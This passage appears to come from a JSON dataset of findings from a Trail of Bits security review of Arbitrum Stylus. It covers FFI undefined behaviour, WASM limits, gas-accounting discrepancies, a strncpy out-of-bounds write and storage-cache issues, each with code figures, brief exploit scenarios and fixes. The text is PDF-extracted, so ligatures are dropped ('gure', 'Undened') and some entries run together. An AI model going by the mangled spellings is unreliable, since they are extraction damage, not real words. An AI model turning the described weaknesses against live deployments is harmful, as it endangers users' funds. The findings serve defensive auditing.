Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "14. Undened behavior when passing padded struct via FFI ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "Union types used in Wasmer that cross FFI boundaries and unconditionally transmute between instances of vmctx and host_env are not derived from repr(C), which could lead to undened behavior due to inconsistent padding. An example is shown in gures 14.1 and 14.2. Types that cross FFI boundaries should be derived from repr(C) so that the order, size, and alignment of elds is exactly what you would expect from C or C++, as documented in the Rustonomicon. #[derive(Copy, Clone, Eq)] pub union VMFunctionContext { /// Wasm functions take a pointer to [`VMContext`]. pub vmctx: *mut VMContext, /// Host functions can have custom environments. pub host_env: *mut std::ffi::c_void, } impl VMFunctionContext { /// Check whether the pointer stored is null or not. pub fn is_null(&self) -> bool { unsafe { self.host_env.is_null() } } } Figure 14.1: A union that is used across FFI boundaries (wasmer/lib/vm/src/vmcontext.rs#2538) /// Call the wasm function pointed to by `callee`. /// /// * `vmctx` - the callee vmctx argument /// * `caller_vmctx` - the caller vmctx argument /// * `trampoline` - the jit-generated trampoline whose ABI takes 4 values, the callee vmctx, the caller vmctx, the `callee` argument below, and then the /// /// `values_vec` argument. /// * `callee` - the third argument to the `trampoline` function /// * `values_vec` - points to a buffer which holds the incoming arguments, and to /// which the outgoing return values will be written. /// /// # Safety /// /// Wildly unsafe because it calls raw function pointers and reads/writes raw /// function pointers. pub unsafe fn wasmer_call_trampoline( trap_handler: Option<*const TrapHandlerFn<'static>>, config: &VMConfig, vmctx: VMFunctionContext, trampoline: VMTrampoline, callee: *const VMFunctionBody, values_vec: *mut u8, ) -> Result<(), Trap> { catch_traps(trap_handler, config, || { mem::transmute::<_, extern \"C\" fn(VMFunctionContext, *const VMFunctionBody, *mut u8)>( trampoline, )(vmctx, callee, values_vec); }) } Figure 14.2: A call to a foreign interface with the union shown in gure 14.1 (wasmer/lib/vm/src/trap/traphandlers.rs#642670) Recommendations Short term, derive types that cross FFI boundaries from repr(C). Long term, enable Clippys default_union_representation lint and integrate cargo miri into the testing of Wasmer. 15. Styluss 63/64th gas forwarding di\u0000ers from go-ethereum Severity: Low Diculty: Low Type: Undened Behavior Finding ID: TOB-STYLUS-15 Target: audit-stylus/arbos/programs/api.go, audit-stylus/arbitrator/stylus/src/host.rs", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Medium"]}, {"title": "16. Undocumented WASM/WAVM limits ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "When a user WASM program is parsed, certain limits are enforced in the program (gure 19.1). These limits are undocumented, so they might be unexpected for users. Additionally, while those limits serve as protection against denial of service and extra checks for bugs, not all of the WASM binary elds are explicitly limited. For example, the number of imports (the imports eld) is not checked, yet this number is constrained by the imports available to the implementation (VM, host modules, etc.). pub fn parse_user(wasm: &'a [u8], page_limit: u16, compile: &CompileConfig) -> Result<(WasmBinary<'a>, StylusData, u16)> { // ... // ensure the wasm fits within the remaining amount of memory if pages > page_limit.into() { let limit = page_limit.red(); bail!(\"memory exceeds limit: {} > {limit}\", pages.red()); } // not strictly necessary, but anti-DoS limits and extra checks in case of bugs macro_rules! limit { ... } limit!(1, bin.memories.len(), \"memories\"); limit!(100, bin.datas.len(), \"datas\"); limit!(100, bin.elements.len(), \"elements\"); limit!(1_000, bin.exports.len(), \"exports\"); limit!(1_000, bin.tables.len(), \"tables\"); limit!(10_000, bin.codes.len(), \"functions\"); limit!(50_000, bin.globals.len(), \"globals\"); for function in &bin.codes { limit!(4096, function.locals.len(), \"locals\") } let table_entries = bin.tables.iter().map(|x| x.initial).saturating_sum(); limit!(10_000, table_entries, \"table entries\"); let max_len = 500; macro_rules! too_long { ... } if let Some((name, _)) = bin.exports.iter().find(|(name, _)| name.len() > max_len) { too_long!(\"name\", name.len()) } if bin.names.module.len() > max_len { too_long!(\"module name\", bin.names.module.len()) } if bin.start.is_some() { bail!(\"wasm start functions not allowed\"); } Figure 16.1: Limits enforced in parse_user (arbitrator/prover/src/binary.rs#L585-L648) Recommendation Short term, document the limits enforced on parsed WASM programs along with an explanation of how those limits were chosen. Also, consider whether limits for currently unchecked elds such as imports should be set. Long term, benchmark the chosen limits to make sure they do not allow for any denial-of-service scenario.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "17. Missing sanity checks for argumentData instruction ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "The argumentData instruction is missing sanity checks in certain cases. In most cases, argumentData is checked to ensure it does not contain any unexpected and unwanted bits, as is done in the executeCrossModuleCall function. // Jump to the target uint32 func = uint32(inst.argumentData); uint32 module = uint32(inst.argumentData >> 32); require(inst.argumentData >> 64 == 0, \"BAD_CROSS_MODULE_CALL_DATA\"); Figure 17.1: A check for unexpected higher bits (stylus-contracts/src/osp/OneStepProver0.sol#158161) However, in some cases, such as in the executeCrossModuleInternalCall function (gure 17.2), argumentData is simply truncated or unchecked. uint32 internalIndex = uint32(inst.argumentData); uint32 moduleIndex = mach.valueStack.pop().assumeI32(); Module memory calledMod; Figure 17.2: The argumentData instruction is truncated. (stylus-contracts/src/osp/OneStepProver0.sol#174176) Additionally, the executeConstPush function does not check argumentData for set upper bits when its value is an I32. function executeConstPush( Machine memory mach, Module memory, Instruction calldata inst, bytes calldata ) internal pure { uint16 opcode = inst.opcode; ValueType ty; if (opcode == Instructions.I32_CONST) { ty = ValueType.I32; } else if (opcode == Instructions.I64_CONST) { ty = ValueType.I64; } else if (opcode == Instructions.F32_CONST) { ty = ValueType.F32; } else if (opcode == Instructions.F64_CONST) { ty = ValueType.F64; } else { revert(\"CONST_PUSH_INVALID_OPCODE\"); } mach.valueStack.push(Value({valueType: ty, contents: uint64(inst.argumentData)})); } Figure 17.3: The executeConstPush function pushes 64 bits of argumentData to the value stack. (stylus-contracts/src/osp/OneStepProver0.sol#3859) However, this case would mean that incorrectly parsed WASM code is being executed, which is unlikely. Recommendation Short term, include the missing sanity checks for argumentData to ensure the upper bits are not set for small value types. Add these checks in all instances mentioned in the nding as well as any others that are identied. Long term, consider adding more sanity checks in areas of the code where the security of many parts relies on one assumption.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "18. Discrepancy in EIP-2200 implementation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "The WasmStateStoreCost function, which is an adaptation of go-ethereums makeGasSStoreFunc function, introduces a discrepancy from the original code (and a deviation from the EIP-2200 specication) when performing EIP-2200s stipend check. In particular, as shown in gure 18.2, the stipend check is performed in the original code as a less than or equal to comparison. func makeGasSStoreFunc(clearingRefund uint64) gasFunc { return func(evm *EVM, contract *Contract, stack *Stack, mem *Memory, memorySize uint64) (uint64, error) { // If we fail the minimum gas availability invariant, fail (0) if contract.Gas <= params.SstoreSentryGasEIP2200 { return 0, errors.New(\"not enough gas for reentrancy sentry\") } Figure 18.2: The original go-ethereum code (go-ethereum/core/vm/operations_acl.go#L27-L30) In Styluss version of the code, the stipend check is meant to be performed by the caller of the function. // Computes the cost of doing a state store in wasm // Note: the code here is adapted from makeGasSStoreFunc with the most recent parameters as of The Merge // Note: the sentry check must be done by the caller func WasmStateStoreCost(db StateDB, program common.Address, key, value common.Hash) uint64 { Figure 18.2: The adapted go-ethereum code in Stylus (stylus/go-ethereum/core/vm/operations_acl_arbitrum.go#L40L43) For example, the check is handled in the user_host__storage_store_bytes32 function as part of the host operations (gure 18.3). pub unsafe extern \"C\" fn user_host__storage_store_bytes32(key: usize, value: usize) { let program = Program::start(2 * PTR_INK + EVM_API_INK); program.require_gas(evm::SSTORE_SENTRY_GAS).unwrap(); [...] } Figure 18.3: The EIP-2200 stipend check performed by the caller (arbitrator/wasm-libraries/user-host/src/host.rs#L38-L40) However, the check is performed as a strictly less than comparison, thereby introducing a discrepancy from EIP-2200 and from the code being adapted (note that require_gas calls require_ink). fn require_ink(&mut self, ink: u64) -> Result<(), OutOfInkError> { let ink_left = self.ink_ready()?; if ink_left < ink { return self.out_of_ink(); } Ok(()) } Figure 18.4: The stipend check implementation (arbitrator/prover/src/programs/meter.rs) Note that in this particular case, the deviation does not lead to any security issues. This discrepancy also appears in the storage_store_bytes32 function. Recommendation Short term, modify the two aected functions so that they perform the stipend check using a less than or equal to comparison, per the EIP-2200 specication. Long term, whenever code is being adapted from a dierent source, thoroughly document any expected deviations; additionally, adapt the original tests, which can help identify any expected deviations.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "19. Tests missing assertions for some errors and values ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "Many of the tests in the codebase perform incomplete assertions, which may prevent the tests from detecting bugs in the event of future code changes. In particular, some tests check only the following:  Whether an error was returned, but not the type or the message of the error  Whether the resulting structures eld values are as expected Additionally, the tests do not test all edge cases. For example, there are no unit tests that ensure that the enforced WASM limits (mentioned in TOB-STYLUS-16) actually work. Those issues can be seen, for example, in the provers tests, as shown in gure 19.1. #[test] pub fn reject_reexports() { let wasm = as_wasm(...); let _ = binary::parse(&wasm, Path::new(\"\")).unwrap_err(); let wasm = as_wasm(...); let _ = binary::parse(&wasm, Path::new(\"\")).unwrap_err(); } #[test] pub fn reject_ambiguous_imports() { let wasm = as_wasm(...); let _ = binary::parse(&wasm, Path::new(\"\")).unwrap(); let wasm = as_wasm(...); let _ = binary::parse(&wasm, Path::new(\"\")).unwrap_err(); } Figure 19.1: stylus/arbitrator/prover/src/test.rs#L14-L54 Recommendations Short term, apply the patch provided in appendix E to improve the quality of the tests. Long term, further refactor the tests to ensure they include assertions for all expected states of values or errors that are returned from the tested functions. 20. Machine state serialization/deserialization does not account for error guards Severity: Low Diculty: Medium Type: Undened Behavior Finding ID: TOB-STYLUS-20 Target: stylus/arbitrator/prover/src/machine.rs", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "21. Lack of minimum-value check for program activation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "The cost for activating WASM programs is paid in native currency instead of gas. However, there is no check of the supplied native currency at the start of the program activation code. This is presumably because the cost is not known up front; nonetheless, a simple zero-value or minimum-value check could prevent the need to perform unnecessary computation if the user supplies insucient value. // Compile a wasm program with the latest instrumentation func (con ArbWasm) ActivateProgram(c ctx, evm mech, value huge, program addr) (uint16, error) { debug := evm.ChainConfig().DebugMode() // charge a fixed cost up front to begin activation if err := c.Burn(1659168); err != nil { return 0, err } version, codeHash, moduleHash, dataFee, takeAllGas, err := c.State.Programs().ActivateProgram(evm, program, debug) if takeAllGas { _ = c.BurnOut() } if err != nil { return version, err } if err := con.payActivationDataFee(c, evm, value, dataFee); err != nil { return version, err } return version, con.ProgramActivated(c, evm, codeHash, moduleHash, program, version) } Figure 21.1: WASM program activation code (stylus/precompiles/ArbWasm.go#L24-L43) Recommendation Short term, include a zero-value or minimum-value check at the start of the program activation code. Long term, review the codebase to identify any other possibly unnecessary computations that could be avoided by checks made in advance.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "22. SetWasmKeepaliveDays sets ExpiryDays instead of KeepaliveDays ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "The SetWasmKeepaliveDays function sets the ExpiryDays value instead of the KeepaliveDays value, making admins unable to set the KeepaliveDays value from the Go side. // Sets the number of days after which programs deactivate func (con ArbOwner) SetWasmExpiryDays(c ctx, _ mech, days uint16) error { return c.State.Programs().SetExpiryDays(days) } // Sets the age a program must be to perform a keepalive func (con ArbOwner) SetWasmKeepaliveDays(c ctx, _ mech, days uint16) error { return c.State.Programs().SetExpiryDays(days) } Figure 22.1: stylus/precompiles/ArbOwner.go#L200L208 Exploit Scenario An admin makes a call to SetWasmKeepaliveDays with the intention of extending the life of some programs; however, they inadvertently expire all programs, as the function incorrectly sets ExpiryDays. Recommendations Short term, x the SetWasmKeepaliveDays function to properly set KeepaliveDays instead of ExpiryDays for programs. Long term, add tests to ensure that the setter and getter functions of chain properties work correctly.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "23. Potential nil dereference error in Node.Start ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "The Node.Start function may crash the node due to a nil dereference error. A nil dereference error can happen when Node.Start calls n.configFetcher.Get (gure 23.1). We assume that n.configFetcher can be nil, as suggested by the nil check at the end of the Node.Start function. If n.configFetcher is nil, a nil dereference error will occur when Node.Start calls the LiveConfig types Get method on it (gure 23.2). We have not determined whether n.configFetcher can actually be nil. func (n *Node) Start(ctx context.Context) error { // config is the static config at start, not a dynamic config config := n.configFetcher.Get() (...) if n.configFetcher != nil { n.configFetcher.Start(ctx) } return nil } Figure 23.1: stylus/arbnode/node.go#L999L1126 func (c *LiveConfig[T]) Get() T { c.mutex.RLock() defer c.mutex.RUnlock() return c.config } Figure 23.2: stylus/cmd/genericconf/liveconfig.go#L38L42 Recommendation Short term, verify whether n.configFetcher can be nil in the Node.Start function; if it cannot be nil, remove the nil check from the function, but if it can, refactor the code to handle that case.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "24. Incorrect dataPricer model update in ProgramKeepalive, causing lower cost and demand ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "When the ProgramKeepalive function calls the dataPricer.UpdateModel function, it passes in the number of program bytes in kilobytes instead of in bytes (gures 24.124.2). As a result, the computed demand and cost values in wei are lower than intended (gure 24.3). func (p Programs) ProgramKeepalive(codeHash common.Hash, time uint64) (*big.Int, error) { program, err := p.getProgram(codeHash, time) (...) cost, err := p.dataPricer.UpdateModel(program.asmEstimate.ToUint32(), time) Figure 24.1: stylus/arbos/programs/programs.go#L429L450 type Program struct { version initGas asmEstimate uint24 // Unit is a kb (predicted canonically) (...) uint16 uint24 Figure 24.2: stylus/arbos/programs/programs.go#L40L47 func (p *DataPricer) UpdateModel(tempBytes uint32, time uint64) (*big.Int, error) { demand, _ := p.demand.Get() (...) demand = arbmath.SaturatingUSub(demand, credit) demand = arbmath.SaturatingUAdd(demand, tempBytes) if err := p.demand.Set(demand); err != nil { return nil, err } (...) costInWei := arbmath.SaturatingUMul(costPerByte, uint64(tempBytes)) return arbmath.UintToBig(costInWei), nil } Figure 24.3: stylus/arbos/programs/data_pricer.go#L61L88 Note that when a program is activated, the DataPricer.UpdateModel is called correctly with the number of program bytes instead of kilobytes (stylus/arbos/programs/programs.go#L246L263). This is because it is called with the info.asmEstimate variable (from the activationInfo.asmEstimate eld), which is in bytes, instead of the estimateKb variable, which is in kilobytes and which is saved into the Program.asmEstimate eld. Exploit Scenario A chain owner sets a keepalive for a program, resulting in an incorrect data price model update and a cheaper execution of the keepalive function. Recommendations Short term, take the following actions:  Fix the ProgramKeepalive function so that it passes in the number of program bytes in bytes instead of kilobytes to the dataPrice.UpdateModel function. Note that this may require code changes in the ActivateProgram function as well so that both price model update calls receive the same value for the program bytes amount.  Change the name of the asmEstimate eld in the Program type to asmEstimateKb to prevent similar issues in the future (unless the eld is refactored to hold the number of bytes). Long term, add tests for this functionality.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Undetermined"]}, {"title": "25. Machine does not properly handle WASM binaries with both Rust and Go support ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "The from_binaries function parses WASM modules from binaries that have either Rust or Go support; however, the function may detect both a Rust and Go binary at the same time (gure 25.1). This would cause an incorrect entrypoint code to be generated from both the Rust and Go support additions. A user could create a module that triggers both Rust and Go support by creating a function named run using the no_mangle attribute in a Rust program and compiling it to a WASM module. pub fn from_binaries(/* ... */) -> Result<Machine> { // Rust support let rust_fn = \"__main_void\"; if let Some(&f) = main_exports.get(rust_fn).filter(|_| runtime_support) { let expected_type = FunctionType::new([], [I32]); ensure!( main_module.func_types[f as usize] == expected_type, \"Main function doesn't match expected signature of [] -> [ret]\", ); entry!(@cross, u32::try_from(main_module_idx).unwrap(), f); entry!(Drop); entry!(HaltAndSetFinished); } // Go support if let Some(&f) = main_exports.get(\"run\").filter(|_| runtime_support) { let mut expected_type = FunctionType::default(); (...) // Launch main with an argument count of 1 and argv_ptr entry!(I32Const, 1); entry!(I32Const, argv_ptr); entry!(@cross, main_module_idx, f); (...) } Figure 25.1: stylus/arbitrator/prover/src/machine.rs#L1194L1260 Exploit Scenario A user creates a Rust program that includes a run function marked with the no_mangle attribute and compiles it to a WASM module to deploy it to the network. The user wastes funds deploying and activating the module, as it ends up being unusable due to the creation of incorrect entrypoint code during the WASM module parsing process. Recommendations Short term, have the from_binaries function check whether both Rust and Go support is included and, if so, error out the processing and inform the user that they cannot have both function names. Additionally, have the function log a message to inform the user whenever Rust or Go support is detected and that the entrypoint code has been instrumented as such. This will help users to understand how their code has been instrumented.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Undetermined"]}, {"title": "26. Computation of internal stack hash uses wrong prex string ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "The prover::machine::Machine::stack_hashes function computes hashes of the co-thread frame stacks, value stacks, and internal stack using a prex string (gure 26.1). The value stack and the internal stack pass in the same prex (Value) to the hash computation macros, so certain sub-hashes of the value stack (first_hash, shown in the gure, and last_hash, omitted from the gure) may have the same value as the internal stack hash. This does not seem to create any security risk, but it seems that the prex for the internal stack was intended to be dierent from other stack prexes. fn stack_hashes(&self) -> (FrameStackHash, ValueStackHash, InterStackHash) { macro_rules! compute { ($stack:expr, $prefix:expr) => {{ let frames = $stack.iter().map(|v| v.hash()); hash_stack(frames, concat!($prefix, \" stack:\")) }}; } macro_rules! compute_multistack { ($field:expr, $stacks:expr, $prefix:expr, $hasher: expr) => {{ let first_elem = *$stacks.first().unwrap(); let first_hash = hash_stack( first_elem.iter().map(|v| v.hash()), concat!($prefix, \" stack:\"), ); // (...) - more code }}; } let frame_stacks = compute_multistack!(/* (...) */, \"Stack frame\",/* (...) */); let value_stacks = compute_multistack!(/* (...) */, \"Value\", /* (...) */); let inter_stack = compute!(self.internal_stack, \"Value\"); (frame_stacks, value_stacks, inter_stack) } Figure 26.1: stylus/arbitrator/prover/src/machine.rs#L2703L2767 Recommendations Change the prex used for the internal stack hash computation in the stack_hashes function to Internal. While this may not change any security property of the system, it will remove a possibility of a hash collision (between the internal stack hash and a partial hash from the value stack), which could create confusion if seen.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "27. WASI preview 1 may be incompatible with future versions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "Stylus was recently updated to use Go 1.21s WASI preview 1 for its WASM execution. (Previously, WASM was run through a JavaScript engine embedded in the Rust code.) However, since this iteration of WASI is only a preview and, according to a related issue on Gos GitHub repository, this interface is evolving without the insurance of backward compatibility, it may require additional eort to add support for WASI preview 2 and future WASI versions. Recommendations Long term, track the developments of support for WASI preview 2 in Go. Make sure to work around any version incompatibilities when updating the Stylus codebase to future WASI versions. References  WASI preview 2 meeting presentation (June 2022)  golang/go#65333: Go issue tracking WASI preview", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "28. Possible out-of-bounds write in strncpy function in Stylus C SDK ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "The strncpy function dened in the Stylus C SDK writes past the destination string when the source string (src) is shorter than the number of bytes (num) to write to the destination string (gure 28.1). This causes another area of the memory of the program to be overwritten, which may have various consequences depending on the program code and its memory layout. char *strncpy(char *dst, const char *src, size_t num) { size_t idx=0; while (idx<num && src[idx]!=0) { idx++; } memcpy(dst, src, idx); if (idx < num) { memset(dst+num, 0, num-idx); } return dst; } Figure 28.1: stylus/arbitrator/langs/c/src/simplelib.c#L6L16 This bug can be detected by compiling an example program using this function (gure 28.2) with ASan (by using the -fsanitize=address ag) with the GCC or Clang compiler. #include <stdio.h> #include <stdint.h> #include <stdlib.h> #include <string.h> char *mystrncpy(char *dst, const char *src, size_t num) { // code from Figure 28.1 } int main() { char buf[4] = {0}; mystrncpy(buf, \"ab\", 4); printf(\"buf='%s'\\n\", buf); } Figure 28.2: An example program that triggers the bug described in the nding Figure 28.3: Output from the example program, showing that it detects this issue Recommendations Short term, change the problematic line to memset(dst+idx, 0, num-idx); to prevent the issue described in this nding. Long term, implement tests for edge-case inputs for the Stylus SDK functions. References  strncpy manual page 29. Insu\u0000cient out-of-bounds check in memcpy utility function for ConstString Severity: Medium Diculty: High Type: Data Validation Finding ID: TOB-STYLUS-29 Target: stylus/arbitrator/langs/rust/stylus-sdk/src/abi/const_string.rs", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "30. Unused and unset timeouts in Arbitrator's JIT code ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "There are potential issues with timeouts in the Arbitrators JIT code: 1. Read and write operations for sockets created in the ready_hostio function (gure 30.1) have no timeouts. If the server the Arbitrator connects to does not send any data, the lack of timeout could result in a denial of service. 2. The ProcessEnv::child_timeout eld, which is set to 15 seconds (gure 30.2), is unused across the codebase. fn ready_hostio(env: &mut WasmEnv) -> MaybeEscape { {...omitted for brevity...} let socket = TcpStream::connect(&address)?; socket.set_nodelay(true)?; // no call to socket.set_{read,write}_timeout let mut reader = BufReader::new(socket.try_clone()?); Figure 30.1: stylus/arbitrator/jit/src/wavmio.rs#L198L303 impl Default for ProcessEnv { fn default() -> Self { Self { forks: false, debug: false, socket: None, last_preimage: None, timestamp: Instant::now(), child_timeout: Duration::from_secs(15), reached_wavmio: false, } } } Figure 30.2: stylus/arbitrator/jit/src/machine.rs#L331L342 Recommendations Short term, take the following actions:  Set timeouts for read and write operations for sockets created in the ready_hostio function.  Remove the Process::child_timeout eld or refactor the code to use it.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "31. New machine hashing format breaks backward compatibility ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "The new hashing format of the One Step Proof (OSP) contracts for the Stylus VM includes new hashing elds that break backward compatibility for the Nitro VM. The machine hash of the OSP contracts captures the entirety of the Stylus VMs state. function hash(Machine memory mach) internal pure returns (bytes32) { // Warning: the non-running hashes are replicated in Challenge if (mach.status == MachineStatus.RUNNING) { bytes32 valueMultiHash = mach.valueMultiStack.hash( mach.valueStack.hash(), mach.recoveryPc != NO_RECOVERY_PC ); bytes32 frameMultiHash = mach.frameMultiStack.hash( mach.frameStack.hash(), mach.recoveryPc != NO_RECOVERY_PC ); bytes memory preimage = abi.encodePacked( \"Machine running:\", valueMultiHash, mach.internalStack.hash(), frameMultiHash, mach.globalStateHash, mach.moduleIdx, mach.functionIdx, mach.functionPc, mach.recoveryPc, mach.modulesRoot ); return keccak256(preimage); } else if (mach.status == MachineStatus.FINISHED) { return keccak256(abi.encodePacked(\"Machine finished:\", mach.globalStateHash)); } else if (mach.status == MachineStatus.ERRORED) { return keccak256(abi.encodePacked(\"Machine errored:\")); } else if (mach.status == MachineStatus.TOO_FAR) { return keccak256(abi.encodePacked(\"Machine too far:\")); } else { revert(\"BAD_MACH_STATUS\"); } } Figure 31.1: The function that creates the hash for the Stylus VM (stylus-contracts/src/state/Machine.sol#4174) The hashing format of the Stylus VM has been updated from the format used to hash the Nitro VM, shown in gure 31.2; the new format includes multistacks (stacks of stacks) and a recovery program counter. function hash(Machine memory mach) internal pure returns (bytes32) { // Warning: the non-running hashes are replicated in Challenge if (mach.status == MachineStatus.RUNNING) { return keccak256( abi.encodePacked( \"Machine running:\", mach.valueStack.hash(), mach.internalStack.hash(), mach.frameStack.hash(), mach.globalStateHash, mach.moduleIdx, mach.functionIdx, mach.functionPc, mach.modulesRoot ) ); } else if (mach.status == MachineStatus.FINISHED) { return keccak256(abi.encodePacked(\"Machine finished:\", mach.globalStateHash)); } else if (mach.status == MachineStatus.ERRORED) { return keccak256(abi.encodePacked(\"Machine errored:\")); } else if (mach.status == MachineStatus.TOO_FAR) { return keccak256(abi.encodePacked(\"Machine too far:\")); } else { revert(\"BAD_MACH_STATUS\"); } } Figure 31.2: The function that creates the hash for the Nitro VM (https://etherscan.io/address/0x3E1f62AA8076000c3218493FE3e0Ae40bcB9A1DF#code) The discrepancy means that the Stylus VM upgrade will cause an inconsistent state between the hash of the Stylus VM and the previous Nitro VM hash, which is important to take into account when fraud proving is activated. Exploit Scenario Alice and Bob enter a challenge before the upgrade of the Stylus VM and OSP contracts. The upgrade occurs and causes a mismatch between the current and previous machine states, so the OSP cannot be run and Alice and Bob are both blocked from proving their state. Bob loses the challenge due to a timeout. Recommendations Short term, ensure that the fraud proving system is deactivated during the Stylus VM upgrade. Long term, thoroughly document the risks associated with breaking backward compatibility of the machine hash and whether/how the networks normal operation can be aected during an upgrade.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "32. Unclear handling of unexpected machine state transitions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "The OSP Machine contract does not handle unexpected state transitions when executing a single opcode in a consistent manner. In some cases (such as when setPc is called), the machine enters an errored state when an unexpected value type is found or when the program counter content contains unexpected data. function setPc(Machine memory mach, Value memory pc) internal pure { if (pc.valueType == ValueType.REF_NULL) { mach.status = MachineStatus.ERRORED; return; } if (pc.valueType != ValueType.INTERNAL_REF) { mach.status = MachineStatus.ERRORED; return; } if (!setPcFromData(mach, pc.contents)) { mach.status = MachineStatus.ERRORED; return; } } Figure 32.1: Unexpected data in the program counter leads to an errored state. (stylus-contracts/src/state/Machine.sol#124137) The internal setPcFromData function enters an early return condition and does not update the machine state when unexpected data is present. function setPcFromData(Machine memory mach, uint256 data) internal pure returns (bool) { if (data >> 96 != 0) { return false; } mach.functionPc = uint32(data); mach.functionIdx = uint32(data >> 32); mach.moduleIdx = uint32(data >> 64); return true; } Figure 32.2: The internal setPcFromData function (stylus-contracts/src/state/Machine.sol#92101) In other cases (such as when the machine is recovering from an errored state and setPcFromRecovery fails), this unexpected case is simply ignored. if (mach.status == MachineStatus.ERRORED && mach.recoveryPc != MachineLib.NO_RECOVERY_PC) { // capture error, recover into main thread. mach.switchCoThreadStacks(); mach.setPcFromRecovery(); mach.status = MachineStatus.RUNNING; } Figure 32.3: A failure in setting the program counter is ignored in mach.setPcFromRecovery. (stylus-contracts/src/osp/OneStepProofEntry.sol#135140) function setPcFromRecovery(Machine memory mach) internal pure returns (bool) { if (!setPcFromData(mach, uint256(mach.recoveryPc))) { return false; } mach.recoveryPc = NO_RECOVERY_PC; return true; } Figure 32.4: The internal setPcFromRecovery function returns a Boolean value indicating an unexpected state. (stylus-contracts/src/state/Machine.sol#103109) In other cases (such as when assumeI32 is called in executeCrossModuleInternalCall), the unexpected value is handled through a require check, which essentially blocks the execution of the OSP. function executeCrossModuleInternalCall( Machine memory mach, Module memory mod, Instruction calldata inst, bytes calldata proof ) internal pure { // Get the target from the stack uint32 internalIndex = uint32(inst.argumentData); uint32 moduleIndex = mach.valueStack.pop().assumeI32(); Figure 32.5: An unexpected state transition cannot be executed. (stylus-contracts/src/osp/OneStepProver0.sol#167175) function assumeI32(Value memory val) internal pure returns (uint32) { uint256 uintval = uint256(val.contents); require(val.valueType == ValueType.I32, \"NOT_I32\"); require(uintval < (1 << 32), \"BAD_I32\"); return uint32(uintval); } Figure 32.6: The assumeI32 function requires the value to be of the expected data format and blocks execution otherwise. (stylus-contracts/src/state/Value.sol#3136) In order to have a clearly dened incident response plan, unexpected state transitions should be handled consistently. Recommendations Short term, have the machine handle all listed unexpected machine state transitions from the OSP in the same way (e.g., by transitioning into an errored state). Long term, document all the invalid state transitions across components and decide on a sound and safe strategy to handle them.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "33. Potential footguns and attack vectors due to new memory model ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "The Stylus memory model introduces new concepts that might be surprising to developers who are familiar with the EVM model; these new concepts could also introduce potential attack vectors. The Stylus memory model uses a global memory model, in which each new memory page allocation is priced exponentially given the number of pages shared across all user programs. This is in contrast to the EVM, which prices memory quadratically and independently of other programs/contracts use of memory. With certain patterns (e.g., ERC-4337 UserOperation forwarding/relaying), it may be essential to have predictable costs for memory expansion in the current context in order to ensure that relayed calls are executed with the conditions the original signer intended. Because a relayed call typically involves handling memory, these costs must be taken into account for the outer call that wraps the inner call. If these costs can be inuenced by previous user programs allocating a large number of memory pages, it might open up new attack vectors. Exploit Scenario A relaying contract wraps an inner call with a xed amount of gas. The inner call requires memory allocation. Because the outer call can open an arbitrary number of memory pages, the inner call fails unexpectedly due to the increased gas cost of global memory allocation. Recommendations Long term, make developers aware of any deviation from the EVM model and its potential security considerations.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "34. Storage cache can become out of sync for reentrant and delegated calls ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "A storage caches known values can become out of sync, causing storage reads to be outdated and storage write operations to 